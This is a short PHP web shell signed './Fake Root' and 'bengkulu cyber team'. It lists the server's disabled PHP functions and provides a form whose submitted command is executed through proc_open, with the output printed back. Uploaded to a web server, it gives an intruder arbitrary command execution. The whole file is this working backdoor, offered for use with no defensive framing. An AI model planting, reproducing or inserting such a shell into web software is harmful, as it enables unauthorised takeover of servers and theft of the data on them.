
<!-- ./Fake Root -->
<!-- bengkulu cyber team -->

<font face=courier size=2><i>proc_open command execute by ./Fake Root</i> | <?php print "\n";$disable_functions = @ini_get("disable_functions"); echo "<font face=courier size=2>disable func : <i><font color=red size=2> ".$disable_functions; print "\n"; ?><br></font>
<form method="post">
<font face=courier new size=2>Command :</font> <input type="text" class="area" name="cmd" size="30" height="20" value="ls -la" style="margin: 5px auto; padding-left: 5px;" required><br>
<button type="submit">Execute</button>
</form><hr>
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "r") // stderr is a file to write to
);
$env = array('some_option' => 'aeiou');
$meki = "";
if(isset($_POST['cmd'])){ 
$cmd = ($_POST['cmd']);
echo "<table width=100%><td><textarea cols=90 rows=25>";
$process = proc_open($cmd, $descriptorspec, $pipes, $meki, $env);
echo stream_get_contents($pipes[1]); die; }
?>
